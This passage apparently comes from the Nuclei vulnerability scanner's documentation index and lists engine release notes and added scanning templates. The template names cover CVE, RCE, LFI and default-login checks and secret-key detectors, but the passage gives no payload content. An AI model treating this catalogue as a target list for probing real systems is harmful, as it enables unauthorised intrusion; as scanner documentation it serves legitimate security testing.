@vzamanillo Added severity information in the output by @vzamanillo Added match groups support in regex extractor Fixed a failed request error on multiple URLs Fixed a bug with helper function by @organiccrap Fixed a bug with port conflict input with URLs and templates by @vzamanillo Fixed a bug with Workflow detecting No Results by @vzamanillo Fixed inconsistent output printing in the terminal Fixed No JSON output with workflows Fixed a bug with matches when multiple headers with the same name by @CasperGN Fixed No result found problem with and condition by @Marmelatze Fixed an issue with all matched part by @rykkard Updated nuclei-templates current and outdated messages Updated template loading UI message by @vzamanillo Nuclei v2.1.0 \u00b6 Nuclei engine rework. Added Progress bar with live results by @manuelbua Added multiple input template support by @manuelbua Added in-template cookie reuse Added key-value supported extractor Added dynamic extraction and reuse Added coloring support in output results by @manuelbua Added wild-card template input support by @wdahlenburg Fixed relative path issue with payloads. Fixed dockerfile go version. Nuclei v2.0.4 \u00b6 Better error handling for templates by @manuelbua Fixed an issue with release binary. Nuclei v2.0.3 \u00b6 Fixed bugs in raw-requests. Fixed update template issue. Nuclei v2.0.2 \u00b6 Fixed an issue with failed requests. Nuclei v2.0.1 \u00b6 Fixed an issue with DSL helper function. Fixed error with auto-updates Github rate limit. Fixed defaults to OR condition when no condition is specified. Nuclei v2.0.0 \u00b6 Fixed raw requests newlines and allow blank request path. Added relative path and auto-template fetching support from installed directory. Added single target support. Added json output support. Chained workflow support with conditions etc. Added template updates feature with auto-updates, etc. Fixed blank output file bug. Nuclei v1.1.7 \u00b6 Added better verbose and debug modes. Inform user and no output file in case of 0 results. Nuclei v1.1.6 \u00b6 Updated default user-agent to include project details Nuclei v1.1.5 \u00b6 Added intruder like support (sniper/pitchfork/clusterbomb) Fuzzing with DSL helpers Fixed bug in body decompression Added global headers via CLI Nuclei v1.1.4 \u00b6 Small improvements. General Fixes. Nuclei v1.1.3 \u00b6 Complex DSL queries Raw requests Proxy (http/socks5) Nuclei v1.1.2 \u00b6 Fixed a bug with DNS requests and output file. Nuclei v1.1.1 \u00b6 Massive code refactor, conditions support + stdin input bug fix. DNS requests support Binary Matcher support Conditional redirects support within templates. Nuclei v1.1.0 \u00b6 Fixed go.mod issue Added extractors for custom text extraction from templates Fixed a bug with default headers Nuclei v1.0.1 \u00b6 Fixed go.mod file issue Nuclei v1.0.0 \u00b6 Initial Release","title":"Nuclei"},{"location":"releases/nuclei-changelog/#changelog","text":"","title":"Changelog"},{"location":"releases/nuclei-changelog/#nuclei-v237-10-may-2021","text":"Improvements to interactsh integration Fixed fatal error with interactsh client","title":"Nuclei v2.3.7 - 10 May 2021"},{"location":"releases/nuclei-changelog/#nuclei-v236-4-may-2021","text":"Interactsh integration into Nuclei Improved support for custom host header w/ template and CLI flag","title":"Nuclei v2.3.6 - 4 May 2021"},{"location":"releases/nuclei-changelog/#nuclei-v235-28-april-2021","text":"Fix for not setting custom user agent in templates by @yabeow Fix for missing IP in the JSON when URLs contain hostname:port by @seb-elttam Fix for temporary file cleanups","title":"Nuclei v2.3.5 - 28 April 2021"},{"location":"releases/nuclei-changelog/#nuclei-v234-2-april-2021","text":"Added improved template exclusion support using tags. Fixed errors listing with excluded templates.","title":"Nuclei v2.3.4 - 2 April 2021"},{"location":"releases/nuclei-changelog/#nuclei-v233-1-april-2021","text":"Fixed a bug with .nuclei-ignore file update Fixed a bug and removed random-agent flag (now used as default)","title":"Nuclei v2.3.3 - 1 April 2021"},{"location":"releases/nuclei-changelog/#nuclei-v232-22-march-2021","text":"Added markdown export to disk in the reporting module ( -de reports ) Fixed body length error with report integration module. Fixed matched counter bug in metrics endpoint. Fixed config file parser bug. Fixed bug with nuclei-ignore file. Fixed a bug with stats counter. Fixed a bug with running newly added templates ( -nt flag) Fixed a but making all workflows to run on running single workflow Fixed panic crash with DNS module. Fixed a bug to exclude timestamp when no-meta flag is used. Fixed crash when running with a non-root user.","title":"Nuclei v2.3.2 - 22 March 2021"},{"location":"releases/nuclei-changelog/#nuclei-v231-14-march-2021","text":"Fixed a bug with severity flag parsing Fixed panic crash with http status codes Fixed retries in DNS requests failing Added exclude-tags/etags support, dos tag will be excluded as default. Added support to severity using tags, (-tags low,high) Added issue-tracker-config file","title":"Nuclei v2.3.1 - 14 March 2021"},{"location":"releases/nuclei-changelog/#nuclei-v230-10-march-2021","text":"Added Headless chrome based templates support Added Network based (TCP) support. Added File based template support. Added HTTP Request clusterning for similar paths. Added Tag based template execution. Added Config file support. Added passive support for HTTP based templates. Added w/workflows to only run workflow based templates Added Request condition support. Added Support for system resolvers. Added Rxpressions package + expressions support to network protocols Added Hex encoding support in matchers Added Dns fallback support Added Missing rawhttp option override Added TLS protocol test Added Parallelism to workflows Added Simple json based http metrics support Added Helper functions to payloads Added r flag to allow users usage of custom resolvers Added Support for http response redirect chain print and match Added max http body resp size option Added Jira,Github,Gitlab issue tracker integration to nuclei Added goflags library support. Added reworked generators package Moved colorizer stuff to pkg/output Moved tracefile to pkg/output + misC Fixed output endpoint in unsafe request without host header Fixed multiple bugs with rawhttp Fixed rawhttp header formatting issues Fixed raw http newline formatting Fixed a bug with workflows Fixed a bug with request count. Fixed underscore in header names for kval matcher Fixed path & port parsing for raw requests","title":"Nuclei v2.3.0 - 10 March 2021"},{"location":"releases/nuclei-changelog/#nuclei-v220-20-nov-2020","text":"Added Turbo intruder support for fuzzing Added HTTP pipeline support for fuzzing Added Connection pooling support for fuzzing Added Raw HTTP support for malformed HTTP requests. Added support for Race condition testing Added \u00a7variable\u00a7 marker for fuzzing Added stats in multithreaded requests (fuzzing) Added YAML syntax support for workflows Added Project file support for request reuse Added global rate limit support Added burp collaborator support Added hmap for reducing memory uses Added clistats in place of a progress bar Added support to DSL matcher to match each unique request Added trace log ( -trace-log ) support Added -templates-version flag to list template version Added -no-meta flag to ignore meta information Added dynamic field support in the template info block Added bulk-size flag Added response time support to DSL Added type to specify type of request Added mmh3 hashing support in helper functions Added shared resolver cache among various HTTP clients Added fuzzing payloads output values to json output Added .nuclei-ignore file from current working directory Added comments support in .nuclei-ignore file Added stop-at-first-match flag Added flag to disable host header and content length Added host information in the JSON response by @savushkin-yauheni Updated flag nC to no-color Updated flag json-requests to include-rr Updated flag pbar to stats Fixed a bug with ignoring paths in the input file by @vzamanillo Fixed a bug with raw requests redirect Fixed a bug with debug flag to display post body Fixed a panic with trace log","title":"Nuclei v2.2.0 - 20 Nov 2020"},{"location":"releases/nuclei-changelog/#nuclei-v211","text":"Added negative matcher support Added support for severity based filtering with severity flag by @manuelbua Added support for template exclusions with exclude flag by @manuelbua Added .nuclei-ignore file support Added rate limit per host with rl flag by @CasperGN Added template list support with tl flag by @vzamanillo Added template name field in JSON output by @vzamanillo Added color support for severity by @vzamanillo Added Progress bar support with the silent flag by @vzamanillo Added support for using local templates along with nuclei-templates Added template preloading at the start of the scan Added support for golangci lint by @vzamanillo Added JSON output support for DNS templates by @Marmelatze Added centralize template loaded info message, add output coloring by @manuelbua Added template ID on HTTP request error message @vzamanillo Added severity information in the output by @vzamanillo Added match groups support in regex extractor Fixed a failed request error on multiple URLs Fixed a bug with helper function by @organiccrap Fixed a bug with port conflict input with URLs and templates by @vzamanillo Fixed a bug with Workflow detecting No Results by @vzamanillo Fixed inconsistent output printing in the terminal Fixed No JSON output with workflows Fixed a bug with matches when multiple headers with the same name by @CasperGN Fixed No result found problem with and condition by @Marmelatze Fixed an issue with all matched part by @rykkard Updated nuclei-templates current and outdated messages Updated template loading UI message by @vzamanillo","title":"Nuclei v2.1.1"},{"location":"releases/nuclei-changelog/#nuclei-v210","text":"Nuclei engine rework. Added Progress bar with live results by @manuelbua Added multiple input template support by @manuelbua Added in-template cookie reuse Added key-value supported extractor Added dynamic extraction and reuse Added coloring support in output results by @manuelbua Added wild-card template input support by @wdahlenburg Fixed relative path issue with payloads. Fixed dockerfile go version.","title":"Nuclei v2.1.0"},{"location":"releases/nuclei-changelog/#nuclei-v204","text":"Better error handling for templates by @manuelbua Fixed an issue with release binary.","title":"Nuclei v2.0.4"},{"location":"releases/nuclei-changelog/#nuclei-v203","text":"Fixed bugs in raw-requests. Fixed update template issue.","title":"Nuclei v2.0.3"},{"location":"releases/nuclei-changelog/#nuclei-v202","text":"Fixed an issue with failed requests.","title":"Nuclei v2.0.2"},{"location":"releases/nuclei-changelog/#nuclei-v201","text":"Fixed an issue with DSL helper function. Fixed error with auto-updates Github rate limit. Fixed defaults to OR condition when no condition is specified.","title":"Nuclei v2.0.1"},{"location":"releases/nuclei-changelog/#nuclei-v200","text":"Fixed raw requests newlines and allow blank request path. Added relative path and auto-template fetching support from installed directory. Added single target support. Added json output support. Chained workflow support with conditions etc. Added template updates feature with auto-updates, etc. Fixed blank output file bug.","title":"Nuclei v2.0.0"},{"location":"releases/nuclei-changelog/#nuclei-v117","text":"Added better verbose and debug modes. Inform user and no output file in case of 0 results.","title":"Nuclei v1.1.7"},{"location":"releases/nuclei-changelog/#nuclei-v116","text":"Updated default user-agent to include project details","title":"Nuclei v1.1.6"},{"location":"releases/nuclei-changelog/#nuclei-v115","text":"Added intruder like support (sniper/pitchfork/clusterbomb) Fuzzing with DSL helpers Fixed bug in body decompression Added global headers via CLI","title":"Nuclei v1.1.5"},{"location":"releases/nuclei-changelog/#nuclei-v114","text":"Small improvements. General Fixes.","title":"Nuclei v1.1.4"},{"location":"releases/nuclei-changelog/#nuclei-v113","text":"Complex DSL queries Raw requests Proxy (http/socks5)","title":"Nuclei v1.1.3"},{"location":"releases/nuclei-changelog/#nuclei-v112","text":"Fixed a bug with DNS requests and output file.","title":"Nuclei v1.1.2"},{"location":"releases/nuclei-changelog/#nuclei-v111","text":"Massive code refactor, conditions support + stdin input bug fix. DNS requests support Binary Matcher support Conditional redirects support within templates.","title":"Nuclei v1.1.1"},{"location":"releases/nuclei-changelog/#nuclei-v110","text":"Fixed go.mod issue Added extractors for custom text extraction from templates Fixed a bug with default headers","title":"Nuclei v1.1.0"},{"location":"releases/nuclei-changelog/#nuclei-v101","text":"Fixed go.mod file issue","title":"Nuclei v1.0.1"},{"location":"releases/nuclei-changelog/#nuclei-v100","text":"Initial Release","title":"Nuclei v1.0.0"},{"location":"releases/templates-changelog/","text":"Changelog \u00b6 Templates v8.3.7 - 30 June 2021 \u00b6 Newly added templates (74) cves/2021/CVE-2021-21234.yaml by @gy741 cves/2021/CVE-2021-21389.yaml by @lotusdll cves/2021/CVE-2021-28164.yaml by @noamrathaus cves/2021/CVE-2021-28169.yaml by @pikpikcu cves/2021/CVE-2021-3223.yaml by @gy741 cves/2021/CVE-2021-35464.yaml by @madrobot cves/2020/CVE-2020-11110.yaml by @emadshanab cves/2020/CVE-2020-11930.yaml by @dhiyaneshDK cves/2020/CVE-2020-25495.yaml by @0x_Akoko cves/2020/CVE-2020-3580.yaml by @0x_Akoko cves/2019/CVE-2019-3401.yaml by @milo2012 cves/2019/CVE-2019-7481.yaml by @_darrenmartyn cves/2018/CVE-2018-16299.yaml by @0x_Akoko cves/2018/CVE-2018-17254.yaml by @Suman_Kar cves/2018/CVE-2018-18775.yaml by @0x_Akoko cves/2018/CVE-2018-18777.yaml by @0x_Akoko cves/2018/CVE-2018-9995.yaml by @princechaddha cves/2017/CVE-2017-12794.yaml by @pikpikcu cves/2017/CVE-2017-15944.yaml by @emadshanab cves/2015/CVE-2015-8813.yaml by @emadshanab cves/2012/CVE-2012-3153.yaml by @sidahmed-malaoui vulnerabilities/wordpress/alfacgiapi-wordpress.yaml by @pussycat0x vulnerabilities/wordpress/wordpress-bbpress-plugin-listing.yaml by @dhiyaneshDK vulnerabilities/wordpress/wordpress-elementor-plugin-listing.yaml by @dhiyaneshDk vulnerabilities/wordpress/wordpress-gtranslate-plugin-listing.yaml by @dhiyaneshDk vulnerabilities/wordpress/wordpress-redirection-plugin-listing.yaml by @dhiyaneshDk vulnerabilities/wordpress/wordpress-updraftplus-pem-key.yaml by @dhiyaneshDk vulnerabilities/wordpress/wordpress-woocommerce-listing.yaml by @dhiyaneshDK vulnerabilities/wordpress/wp-123contactform-plugin-listing.yaml by @pussycat0x vulnerabilities/wordpress/wp-gtranslate-open-redirect.yaml by @dhiyaneshDK vulnerabilities/wordpress/wp-multiple-theme-ssrf.yaml by @madrobot vulnerabilities/wordpress/wp-plugin-utlimate-member.yaml by @pussycat0x vulnerabilities/wordpress/wpmudev-my-calender-xss.yaml by @dhiyaneshDk vulnerabilities/wordpress/wpmudev-pub-keys.yaml by @dhiyaneshDk vulnerabilities/other/huawei-hg659-lfi.yaml by @pikpikcu vulnerabilities/other/jeewms-lfi.yaml by @pikpikcu vulnerabilities/other/resin-inputfile-fileread.yaml by @princechaddha vulnerabilities/other/resin-viewfile-lfr.yaml by @princechaddha default-logins/zmanda/zmanda-default-credential.yaml by @Techryptic misconfiguration/aem/aem-crx-bypass.yaml by @dhiyaneshDK misconfiguration/phpmyadmin-sql.php-server.yaml by @pussycat0x misconfiguration/zhiyuan-oa-unauthorized.yaml by @pikpikcu takeovers/flywheel-takeover.yaml by @smaranchand takeovers/sprintful-takeover.yaml by @Mhdsamx exposed-panels/adobe-experience-manager-login.yaml by @dhiyaneshDK exposed-panels/akamai-cloudtest.yaml by @emadshanab exposed-panels/avtech-dvr-exposure.yaml by @geeknik exposed-panels/calendarix-panel.yaml by @r3dg33k exposed-panels/iptime-router.yaml by @gy741 exposed-panels/jenkins-api-panel.yaml by @righettod exposed-panels/livezilla-login-panel.yaml by @__Fazal exposed-panels/mikrotik-routeros.yaml by @gy741 exposed-panels/netis-router.yaml by @gy741 exposed-panels/plastic-scm-login.yaml by @dhiyaneshDK exposed-panels/sitecore-login-panel.yaml by @b4uh0lz exposed-panels/zoho-manageengine-adaudit.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-adselfservice-plus.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-analyticsplus.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-apex-helpdesk.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-applications-manager.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-assetexplorer.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-desktop.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-opmanager.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-servicedesk.yaml by @dhiyaneshDK exposed-panels/zoho-manageengine-supportcenter.yaml by @dhiyaneshDK miscellaneous/addeventlistener-detect.yaml by @yavolo miscellaneous/clientaccesspolicy.yaml by @emadshanab network/expn-mail-detect.yaml by @r3dg33k network/smb-v1-detection.yaml by @r3dg33k network/smtp-detection.yaml by @r3dg33k network/starttls-mail-detect.yaml by @r3dg33k network/vsftpd-detection.yaml by @pussycat0x technologies/rhymix-cms-detect.yaml by @gy741 technologies/webmodule-ee.yaml by @pussycat0x Templates v8.3.6 - 18 June 2021 \u00b6 Newly added templates (30) cves/2021/CVE-2021-28854.yaml by pdteam cves/2021/CVE-2021-24237.yaml by @Akokonunes cves/2021/CVE-2021-22214.yaml by @skar4444 cves/2019/CVE-2019-7254.yaml by @Akokonunes cves/2018/CVE-2018-1000533.yaml by @pikpikcu cves/2018/CVE-2018-16668.yaml by @geeknik cves/2018/CVE-2018-16670.yaml by @geeknik cves/2018/CVE-2018-16671.yaml by @geeknik cves/2013/CVE-2013-2248.yaml by @Akokonunes cnvd/CNVD-2021-15822.yaml by @pikpikcu vulnerabilities/confluence/confluence-ssrf-sharelinks.yaml by @Techbrunch vulnerabilities/gitlab/gitlab-user-enumeration.yaml by @skar4444 vulnerabilities/gitlab/gitlab-user-open-api.yaml by @skar4444 vulnerabilities/other/tamronos-rce.yaml by @pikpikcu vulnerabilities/wordpress/wpdm-cache-session.yaml by @DhiyaneshGeek misconfiguration/adobe/adobe-connect-username-exposure.yaml by @DhiyaneshGeek misconfiguration/adobe/adobe-connect-version.yaml by @DhiyaneshGeek misconfiguration/ssrf-via-oauth-misconfig.yaml by @mrsin15 default-logins/gitlab/gitlab-weak-login.yaml by @skar4444 exposed-panels/adobe-connect-central-login.yaml by @DhiyaneshGeek exposed-panels/glpi-login.yaml by @DhiyaneshGeek exposed-panels/odoo-database-manager.yaml by @linfatall network/openssh-username-enumeration.yaml by @r3dg33k dns/nameserver-detection.yaml by pdteam headless/extract-urls.yaml by @dwisiswant0 technologies/detect-sentry.yaml by @Sicks3c technologies/metabase-detect.yaml by @revblock technologies/sap-web-dispatcher-admin-portal.yaml by @randomstr1ng technologies/sap-web-dispatcher.yaml by @randomstr1ng technologies/vmware-vrealize-detect.yaml by @milo2012 Templates v8.3.5 - 13 June 2021 \u00b6 Newly added templates (56) cves/2018/CVE-2018-16836.yaml by @Akokonunes cves/2017/CVE-2017-5487.yaml by @Manas_Harsh , @daffainfo cves/2014/CVE-2014-2383.yaml by @Akokonunes exposed-panels/landfill-remote-monitoring-control.yaml by @geeknik exposed-panels/rstudio-detect.yaml by @pdelteil exposures/configs/phalcon-framework-source.yaml by @pdelteil exposures/tokens/generic/shoppable-token.yaml by @pdelteil fuzzing/mdb-database-file.yaml by pdteam technologies/nexus-detect.yaml by @righettod vulnerabilities/other/ckan-dom-based-xss.yaml by @DhiyaneshGeek vulnerabilities/other/mpsec-lfi.yaml by @pikpikcu vulnerabilities/other/php-timeclock-xss.yaml by @pikpikcu vulnerabilities/other/php-zerodium-backdoor-rce.yaml by @DhiyaneshGeek vulnerabilities/wordpress/wordpress-db-backup-listing.yaml by @skar4444 file/android/adb-backup-enabled.yaml by @0xgaurang file/android/biometric-detect.yaml by @0xgaurang file/android/certificate-validation.yaml by @0xgaurang file/android/content-scheme.yaml by @0xgaurang file/android/debug-enabled.yaml by @0xgaurang file/android/dynamic-broadcast-receiver.yaml by @0xgaurang file/android/file-scheme.yaml by @0xgaurang file/android/provider-path.yaml by @0xgaurang file/android/webview-addjavascript-interface.yaml by @0xgaurang file/android/webview-javascript.yaml by @0xgaurang file/android/webview-load-url.yaml by @0xgaurang file/android/webview-universal-access.yaml by @0xgaurang file/keys/amazon-mws-auth-token.yaml by @0xgaurang file/keys/aws-access-id.yaml by @0xgaurang file/keys/aws-cognito.yaml by @0xgaurang file/keys/cloudinary.yaml by @0xgaurang file/keys/credentials.yaml by @0xgaurang file/keys/dynatrace-token.yaml by @0xgaurang file/keys/facebook-client-id.yaml by @0xgaurang file/keys/facebook-secret.yaml by @0xgaurang file/keys/firebase-database.yaml by @0xgaurang file/keys/gcp-service-account.yaml by @0xgaurang file/keys/google-api.yaml by @0xgaurang file/keys/linkedin-id.yaml by @0xgaurang file/keys/mailchimp-api.yaml by @0xgaurang file/keys/mailgun-api.yaml by @0xgaurang file/keys/paypal-braintree-token.yaml by @0xgaurang file/keys/pictatic-api-key.yaml by @0xgaurang file/keys/private-key.yaml by @0xgaurang file/keys/s3-bucket.yaml by @0xgaurang file/keys/sendgrid-api.yaml by @0xgaurang file/keys/shopify-custom-token.yaml by @0xgaurang file/keys/shopify-private-token.yaml by @0xgaurang file/keys/shopify-shared-secret.yaml by @0xgaurang file/keys/shopify-token.yaml by @0xgaurang file/keys/slack-api.yaml by @0xgaurang file/keys/slack-webhook.yaml by @0xgaurang file/keys/square-access-token.yaml by @0xgaurang file/keys/square-oauth-secret.yaml by @0xgaurang file/keys/stripe-api-key.yaml by @0xgaurang file/keys/twilio-api.yaml by @0xgaurang file/keys/twitter-secret.yaml by @0xgaurang Templates v8.3.4 - 10 June 2021 \u00b6 Newly added templates (25) cves/2021/CVE-2021-24285.yaml by @shreyapohekar cves/2021/CVE-2021-24316.yaml by @Akokonunes cves/2020/CVE-2020-36289.yaml by @DhiyaneshGeek cves/2020/CVE-2020-6308.yaml by @Mad-robot cves/2019/CVE-2019-2767.yaml by @Mad-robot cves/2019/CVE-2019-2616.yaml by pdteam cves/2017/CVE-2017-9140.yaml by @DhiyaneshGeek vulnerabilities/other/interlib-fileread.yaml by @pikpikcu vulnerabilities/wordpress/wp-mailchimp-log-exposure.yaml by @AashiqRamachandran vulnerabilities/wordpress/wp-popup-listing.yaml by @AashiqRamachandran miscellaneous/apple-app-site-association.yaml by @DhiyaneshGeek miscellaneous/email-extractor.yaml by @DhiyaneshGeek misconfiguration/artifactory-anonymous-deploy.yaml by @DhiyaneshGeek misconfiguration/exposed-jquery-file-upload.yaml by @DhiyaneshGeek misconfiguration/private-key-exposure.yaml by @AashiqRamachandran misconfiguration/sap/sap-netweaver-info-leak.yaml by pdteam misconfiguration/iis-internal-ip-disclosure.yaml by @WillD96 exposed-panels/luci-login-detection.yaml by @AashiqRamachandran exposures/configs/zend-config-file.yaml by pdteam exposures/files/shellscripts.yaml by @DhiyaneshGeek network/sap-router-info-leak.yaml by pdteam network/sap-router.yaml by pdteam technologies/firebase-urls.yaml by @DhiyaneshGeek technologies/sap-netweaver-webgui.yaml by pdteam iot/epson-wf-series.yaml by @AashiqRamachandran Templates v8.3.3 - 4 June 2021 \u00b6 Newly added templates (11) cves/2020/CVE-2020-11978.yaml by pdteam cnvd/CNVD-2021-30167.yaml by @pikpikcu default-logins/apache/airflow-default-credentials.yaml by pdteam vulnerabilities/other/odoo-cms-redirect.yaml by @Akokonunes exposures/configs/detect-drone-config.yaml by @geeknik misconfiguration/airflow/airflow-debug.yaml by pdteam misconfiguration/alibaba-mongoshake-unauth.yaml by @pikpikcu exposed-panels/airflow-panel.yaml by pdteam exposed-panels/dotcms-admin-panel.yaml by @impramodsargar technologies/airflow-detect.yaml by pdteam workflows/airflow-workflow.yaml by pdteam Templates v8.3.2 - 1 June 2021 \u00b6 Newly added templates (41) cves/2021/CVE-2021-21985.yaml by @dorkerdevil cves/2017/CVE-2017-14535.yaml by @pikpikcu cves/2017/CVE-2017-3528.yaml by @Akokonunes vulnerabilities/other/blue-ocean-excellence-lfi.yaml by @pikpikcu vulnerabilities/other/hjtcloud-arbitrary-file-read.yaml by @pikpikcu vulnerabilities/other/hjtcloud-rest-arbitrary-file-read.yaml by @pikpikcu vulnerabilities/other/ns-asg-file-read.yaml by @pikpikcu vulnerabilities/wordpress/wordpress-db-repair.yaml by @aldo-moreno-leon vulnerabilities/wordpress/wp-plugin-statistics-sqli.yaml by @Udyz exposures/configs/exposed-vscode.yaml by @AashiqRamachandran exposures/configs/hikvision-info-leak.yaml by @pikpikcu default-logins/arl/arl-default-password.yaml by @pikpikcu default-logins/szhe/szhe-default-password.yaml by @pikpikcu dns/dns-waf-detect.yaml by @1u4nx exposed-panels/clave-login-panel.yaml by @linfatall exposed-panels/ems-login-panel.yaml by @linfatall exposed-panels/lancom-router-panel.yaml by @linfatall exposed-panels/openerp-database.yaml by @impramodsargar exposed-panels/servicedesk-login-panel.yaml by @AashiqRamachandran exposed-panels/synnefo-admin-panel.yaml by @impramodsargar exposed-panels/zenario-login-panel.yaml by @linfatall technologies/default-apache-test-page.yaml by @DhiyaneshGeek technologies/default-apache2-page.yaml by @DhiyaneshGeek technologies/default-apache2-ubuntu-page.yaml by @DhiyaneshGeek technologies/default-asp.net-page.yaml by @DhiyaneshGeek technologies/default-centos-test-page.yaml by @DhiyaneshGeek technologies/default-django-page.yaml by @DhiyaneshGeek technologies/default-fastcgi-page.yaml by @DhiyaneshGeek technologies/default-fedora-page.yaml by @DhiyaneshGeek technologies/default-glassfish-server-page.yaml by @DhiyaneshGeek technologies/default-iis7-page.yaml by @DhiyaneshGeek technologies/default-jetty-page.yaml by @DhiyaneshGeek technologies/default-microsoft-azure-page.yaml by @DhiyaneshGeek technologies/default-nginx-page.yaml by @DhiyaneshGeek technologies/default-oracle-application-page.yaml by @DhiyaneshGeek technologies/default-payara-server-page.yaml by @DhiyaneshGeek technologies/default-plesk-page.yaml by @DhiyaneshGeek technologies/default-redhat-test-page.yaml by @DhiyaneshGeek technologies/default-ssltls-test-page.yaml by @DhiyaneshGeek technologies/default-tomcat-page.yaml by @DhiyaneshGeek technologies/default-windows-server-page.yaml by @DhiyaneshGeek Templates v8.3.1 - 29 May 2021 \u00b6 Newly added templates (19) cves/2021/CVE-2021-33564.yaml by @0xsapra cves/2020/CVE-2020-35736.yaml by @pikpikcu cves/2017/CVE-2017-1000486.yaml by @Morn98 vulnerabilities/other/natshell-rce.yaml by @pikpikcu vulnerabilities/wordpress/wp-config-setup.yaml by @princechaddha vulnerabilities/wordpress/wp-full-path-disclosure.yaml by @blacklist-arcc vulnerabilities/wordpress/wp-install.yaml by @princechaddha vulnerabilities/wordpress/wp-localize-post-lfi.yaml by @0x240x23elu vulnerabilities/wordpress/wp-mail-masta-lfi.yaml by @0x240x23elu vulnerabilities/wordpress/wp-simple-fields-lfi.yaml by @0x240x23elu vulnerabilities/wordpress/wp-site-editor-lfi.yaml by @0x240x23elu vulnerabilities/wordpress/wp-tutor-lfi.yaml by @0x240x23elu vulnerabilities/wordpress/wp-wechat-broadcast-lfi.yaml by @0x240x23elu exposures/configs/esmtprc-config.yaml by @geeknik exposures/configs/robomongo-credential.yaml by @geeknik exposed-panels/portainer-init-deploy.yaml by @princechaddha exposed-panels/securenvoy-panel.yaml by @0xrod iot/xp-webcam.yaml by @AashiqRamachandran technologies/jsf-detection.yaml by @Morn98 Templates v8.3.0 - 25 May 2021 \u00b6 Newly added templates (14) cves/2021/CVE-2021-27850.yaml by pdteam cves/2020/CVE-2020-15227.yaml by @Becivells vulnerabilities/other/maian-cart-preauth-rce.yaml by pdteam misconfiguration/cx-cloud-upload-detect.yaml by @DhiyaneshGeek misconfiguration/kubeflow-dashboard-unauth.yaml by @DhiyaneshGeek misconfiguration/pinpoint-unauth.yaml by @DhiyaneshGeek default-logins/jenkins/jenkins-default.yaml by @Zandros0 exposed-panels/cx-cloud-login.yaml by @DhiyaneshGeek exposed-panels/jenkins-login.yaml by @Zandros0 exposed-panels/phppgadmin-panel.yaml by @Ganofins exposed-panels/plesk-obsidian.yaml by @DhiyaneshGeek exposed-panels/server-backup-login.yaml by @DhiyaneshGeek technologies/maian-cart-detect.yaml by pdteam technologies/xxljob-admin-detect.yaml by pdteam Templates v8.2.9 - 20 May 2021 \u00b6 Newly added templates (19) cves/2021/CVE-2021-29622.yaml by @geeknik cves/2020/CVE-2020-36112.yaml by @geeknik cves/2009/CVE-2009-0545.yaml by @geeknik vulnerabilities/magento/magento-2-exposed-api.yaml by @techbrunch vulnerabilities/magento/magento-cacheleak.yaml by @techbrunch vulnerabilities/magento/magento-unprotected-dev-files.yaml by @techbrunch vulnerabilities/other/fanruanoa2012-disclosure.yaml by @bu1xuan2 misconfiguration/springboot/springboot-beans.yaml by @ajaysenr exposures/configs/nagios-status-page.yaml by @DhiyaneshGeek exposures/files/ioncube-loader-wizard.yaml by @Mubspatel exposed-panels/exposed-nomad.yaml by pdteam exposed-panels/magento-admin-panel.yaml by @techbrunch exposed-panels/saferoads-vms-login.yaml by @DhiyaneshGeek technologies/fanruanoa-detect.yaml by @bu1xuan2 technologies/fanruanoa2012-detect.yaml by @bu1xuan2 technologies/landrayoa-detect.yaml by @bu1xuan2 technologies/magento-detect.yaml by @techbrunch technologies/pega-detect.yaml by @sshell workflows/magento-workflow.yaml by @techbrunch Templates v8.2.8 - 17 May 2021 \u00b6 Newly added templates (13) cves/2021/CVE-2021-24176.yaml by @Ganofins cves/2021/CVE-2021-27651.yaml by @idealphase cves/2014/CVE-2014-3744.yaml by @geeknik default-logins/flir/flir-ax8-default-credentials.yaml by @pikpikcu vulnerabilities/other/flir-path-traversal.yaml by @pikpikcu vulnerabilities/other/natshell-path-traversal.yaml by @pikpikcu vulnerabilities/other/resin-cnnvd-200705-315.yaml by @princechaddha exposures/files/joomla-file-listing.yaml by @iampritam97 miscellaneous/google-floc-disabled.yaml by @geeknik miscellaneous/tabnabbing-check.yaml by @bolli95 misconfiguration/unauthenticated-tensorboard.yaml by @DhiyaneshGeek technologies/octobercms-detect.yaml by @cydave technologies/voipmonitor-detect.yaml by @bu1xuan2 Templates v8.2.7 - 16 May 2021 \u00b6 Newly added templates (6) cves/2021/CVE-2021-31537.yaml by @geeknik misconfiguration/apache-filename-brute-force.yaml by @geeknik network/rdp-detect.yaml by @princechaddha default-logins/panabit/panabit-default-password.yaml by @pikpikcu technologies/springboot-actuator.yaml by pdteam technologies/wazuh-detect.yaml by @cydave Templates v8.2.6 - 12 May 2021 \u00b6 Newly added templates (12) cves/2017/CVE-2017-12149.yaml by @fopina default-logins/showdoc/showdoc-default-password.yaml by @pikpikcu exposures/configs/ruijie-phpinfo.yaml by @pikpikcu exposures/logs/php-debug-bar.yaml by @DhiyaneshGeek misconfiguration/cloudflare-image-ssrf.yaml by @vavkamil misconfiguration/sap-directory-listing.yaml by @DhiyaneshGeek misconfiguration/unauthenticated-netdata.yaml by @DhiyaneshGeek misconfiguration/unauthenticated-zippkin.yaml by @DhiyaneshGeek vulnerabilities/other/showdoc-file-upload-rce.yaml by @pikpikcu exposed-panels/microsoft-exchange-control-panel.yaml by @r3dg33k exposures/backups/php-backup-files.yaml by @StreetOfHackerR007 fuzzing/xff-403-bypass.yaml by @vavkamil Templates v8.2.5 - 8 May 2021 \u00b6 Newly added templates (15) cves/2021/CVE-2021-28073.yaml by @z3bd cves/2021/CVE-2021-30461.yaml by @shifacyclewala ,hackergautam cves/2020/CVE-2020-9490.yaml by @philippedelteil exposed-panels/bitrix-panel.yaml by @juicypotato1 exposed-panels/monitorix-exposure.yaml by @geeknik exposures/configs/plesk-stat.yaml by @th3 .d1p4k exposures/logs/darkstat-detect.yaml by @geeknik exposures/logs/pyramid-debug-toolbar.yaml by @geeknik exposures/logs/squid-analysis-report-generator.yaml by @geeknik misconfiguration/exposed-kafdrop.yaml by @DhiyaneshGeek vulnerabilities/oracle/oracle-ebs-xss.yaml by @DhiyaneshGeek vulnerabilities/other/joomla-com-fabrik-lfi.yaml by @DhiyaneshGeek vulnerabilities/other/kafdrop-xss.yaml by @DhiyaneshGeek 